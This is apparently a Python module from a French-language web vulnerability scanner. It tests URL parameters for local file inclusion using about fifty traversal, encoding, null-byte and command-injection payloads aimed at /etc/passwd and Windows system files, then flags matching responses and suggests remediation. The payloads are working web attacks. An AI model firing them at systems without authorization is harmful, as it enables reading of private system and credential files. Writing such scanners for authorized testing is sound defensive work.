"""
Advanced LFI (Local File Inclusion) Scanner
Basé sur AutoPWN-Suite avec 50+ payloads encodés
"""

import aiohttp
import asyncio
from typing import List, Tuple, Set, Optional
from loguru import logger
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from core.models import Vulnerabilite
from datetime import datetime


class LFIScanner:
    """
    Scanner LFI avancé avec multiples techniques d'encodage
    Inspiré d'AutoPWN-Suite
    """
    
    def __init__(self, auth_config: Optional[dict] = None):
        """
        Args:
            auth_config: Configuration d'authentification optionnelle
        """
        self.auth_config = auth_config or {}
        self.tested_urls = set()  # Éviter tests dupliqués
        
        # 50+ payloads LFI (inspirés AutoPWN-Suite)
        self.lfi_payloads = [
            # Basic traversal
            "../../../../../etc/passwd",
            "../../../../../../etc/passwd",
            "../../../../../../../etc/passwd",
            "../../../../../../../../etc/passwd",
            "../../../../../../../../../etc/passwd",
            
            # URL encoded
            "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
            "..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd",
            
            # Double encoding
            "/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
            
            # Command injection variations
            r"\&apos;/bin/cat%20/etc/passwd\&apos;",
            r"%0a/bin/cat%20/etc/passwd",
            
            # Unicode encoding
            "/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
            "/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd",
            
            # Absolute paths
            "/etc/passwd",
            "/etc/default/passwd",
            "/etc/security/passwd",
            
            # Multiple slashes and dots
            "/./././././././././././etc/passwd",
            "/../../../../../../../../../../etc/passwd",
            "/../../../../../../../../../../etc/passwd^^",
            "///////../../../etc/passwd",
            
            # Backslash variations (Windows-style)
            r"/..\\../..\\../..\\../..\\../..\\../..\\../etc/passwd",
            r".\\./.\\./.\\./.\\./.\\./.\\./etc/passwd",
            r"....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ ....\\/ etc/passwd",
            
            # Null byte injection
            "%00/etc/passwd%00",
            "/etc/passwd%00",
            "../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00",
            "../../etc/passwd%00",
            "../etc/passwd%00",
            
            # Extension bypass
            "/../../../../../../../../../../../etc/passwd%00.html",
            "/../../../../../../../../../../../etc/passwd%00.jpg",
            "/../../../../../../../../../../../etc/passwd%00.php",
            "/../../../../../../../../../../../etc/passwd%00.txt",
            
            # Special characters
            "../../../../../../etc/passwd&=%3C%3C%3C%3C",
            
            # Dot-dot-slash encoded
            "..2fetc2fpasswd",
            "..2fetc2fpasswd%00",
            "..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd",
            
            # Windows paths
            r"..\..\..\..\..\..\..\..\windows\system32\drivers\etc\hosts",
            r"..\..\..\..\..\..\..\windows\win.ini",
            r"C:\windows\system32\drivers\etc\hosts",
            r"C:\windows\win.ini",
            
            # Mixed case
            "..././..././..././..././etc/passwd",
            "....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd",
            
            # Relative paths
            "etc/passwd",
            "../../etc/passwd",
            "../etc/passwd",
        ]
        
        # Patterns de validation pour /etc/passwd
        self.validation_patterns = [
            b"root:x:0:0:",
            b"root:x:0:0:root:",
            b"daemon:",
            b"bin:x:1:1:",
            b"/bin/bash",
            b"/bin/sh",
        ]
        
        # Patterns Windows
        self.windows_patterns = [
            b"[extensions]",
            b"[fonts]",
            b"for 16-bit app support",
        ]
    
    async def scan(
        self, 
        urls: List[str],
        session: Optional[aiohttp.ClientSession] = None
    ) -> List[Vulnerabilite]:
        """
        Scan URLs pour LFI
        
        Args:
            urls: Liste d'URLs à tester
            session: Session aiohttp optionnelle
            
        Returns:
            Liste de vulnérabilités LFI trouvées
        """
        logger.info(f"🔍 LFI Scanner: Test de {len(urls)} URLs")
        
        vulnerabilites = []
        
        # Créer session si nécessaire
        if session is None:
            async with aiohttp.ClientSession() as sess:
                vulnerabilites = await self._scan_with_session(urls, sess)
        else:
            vulnerabilites = await self._scan_with_session(urls, session)
        
        logger.success(
            f"✅ LFI Scan terminé: {len(vulnerabilites)} vulnérabilités trouvées"
        )
        
        return vulnerabilites
    
    async def _scan_with_session(
        self,
        urls: List[str],
        session: aiohttp.ClientSession
    ) -> List[Vulnerabilite]:
        """Scanner avec session existante"""
        vulnerabilites = []
        
        # Filtrer URLs avec paramètres
        testable_urls = [url for url in urls if '?' in url]
        
        if not testable_urls:
            logger.warning("⚠️  Aucune URL avec paramètres pour test LFI")
            return []
        
        logger.info(f"📊 {len(testable_urls)} URLs testables identifiées")
        
        # Tester chaque URL
        for url in testable_urls:
            vulns = await self._test_url(url, session)
            vulnerabilites.extend(vulns)
        
        return vulnerabilites
    
    async def _test_url(
        self,
        url: str,
        session: aiohttp.ClientSession
    ) -> List[Vulnerabilite]:
        """
        Test une URL spécifique pour LFI
        
        Args:
            url: URL à tester (doit contenir des paramètres)
            session: Session aiohttp
            
        Returns:
            Liste de vulnérabilités trouvées
        """
        vulnerabilites = []
        
        try:
            # Parser URL
            parsed = urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            params = parse_qs(parsed.query)
            
            # Tester chaque paramètre
            for param_name in params.keys():
                # Créer clé unique pour éviter duplicatas
                test_key = f"{base_url}?{param_name}"
                
                if test_key in self.tested_urls:
                    continue
                
                self.tested_urls.add(test_key)
                
                # Tester avec chaque payload
                for payload in self.lfi_payloads:
                    vuln = await self._test_payload(
                        base_url,
                        param_name,
                        payload,
                        session
                    )
                    
                    if vuln:
                        vulnerabilites.append(vuln)
                        # Sortir dès qu'on trouve une vuln pour ce paramètre
                        break
        
        except Exception as e:
            logger.debug(f"Erreur test LFI sur {url}: {str(e)}")
        
        return vulnerabilites
    
    async def _test_payload(
        self,
        base_url: str,
        param_name: str,
        payload: str,
        session: aiohttp.ClientSession
    ) -> Optional[Vulnerabilite]:
        """
        Test un payload spécifique
        
        Args:
            base_url: URL de base sans paramètres
            param_name: Nom du paramètre à fuzzer
            payload: Payload LFI à tester
            session: Session aiohttp
            
        Returns:
            Vulnerabilite si trouvée, None sinon
        """
        # Construire URL de test
        test_url = f"{base_url}?{param_name}={payload}"
        
        try:
            async with session.get(
                test_url,
                timeout=aiohttp.ClientTimeout(total=10),
                allow_redirects=False,
                ssl=False  # Ignorer erreurs SSL
            ) as response:
                
                # Lire contenu
                content = await response.read()
                
                # Vérifier patterns
                if self._is_vulnerable(content):
                    logger.warning(f"🚨 LFI trouvée: {test_url}")
                    
                    # Créer vulnérabilité
                    vuln = Vulnerabilite(
                        type="Local File Inclusion (LFI)",
                        severite="ÉLEVÉ",
                        url=base_url,
                        description=(
                            f"Vulnérabilité LFI détectée sur le paramètre '{param_name}'. "
                            f"L'application permet la lecture de fichiers système arbitraires."
                        ),
                        payload=payload,
                        preuve=(
                            f"Requête: {test_url}\n"
                            f"Paramètre vulnérable: {param_name}\n"
                            f"Payload: {payload}\n"
                            f"Confirmation: Contenu /etc/passwd détecté"
                        ),
                        remediation=(
                            "1. Valider et filtrer tous les inputs utilisateur\n"
                            "2. Utiliser une whitelist de fichiers autorisés\n"
                            "3. Éviter l'usage de chemins dynamiques\n"
                            "4. Désactiver allow_url_fopen et allow_url_include (PHP)\n"
                            "5. Appliquer le principe du moindre privilège"
                        ),
                        cvss_score=7.5,
                        timestamp=datetime.now()
                    )
                    
                    return vuln
        
        except asyncio.TimeoutError:
            logger.debug(f"Timeout sur {test_url}")
        except Exception as e:
            logger.debug(f"Erreur test {test_url}: {str(e)}")
        
        return None
    
    def _is_vulnerable(self, content: bytes) -> bool:
        """
        Vérifie si le contenu indique une vulnérabilité LFI
        
        Args:
            content: Contenu de la réponse HTTP
            
        Returns:
            True si vulnérable
        """
        # Vérifier patterns Linux/Unix
        for pattern in self.validation_patterns:
            if pattern in content:
                return True
        
        # Vérifier patterns Windows
        for pattern in self.windows_patterns:
            if pattern in content:
                return True
        
        return False
    
    async def quick_test(self, url: str) -> bool:
        """
        Test rapide d'une URL pour LFI
        
        Args:
            url: URL à tester
            
        Returns:
            True si vulnérable
        """
        async with aiohttp.ClientSession() as session:
            vulns = await self._test_url(url, session)
            return len(vulns) > 0
